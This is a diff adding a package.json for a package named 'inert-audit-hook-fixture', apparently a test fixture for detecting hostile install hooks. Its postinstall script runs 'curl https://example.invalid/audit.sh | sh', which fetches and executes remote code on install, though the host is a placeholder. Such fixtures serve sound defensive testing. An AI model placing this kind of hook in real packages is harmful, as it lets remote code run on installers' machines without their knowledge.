@@ -1,0 +1,7 @@
+{
+  "name": "inert-audit-hook-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/audit.sh | sh"
+  }
+}
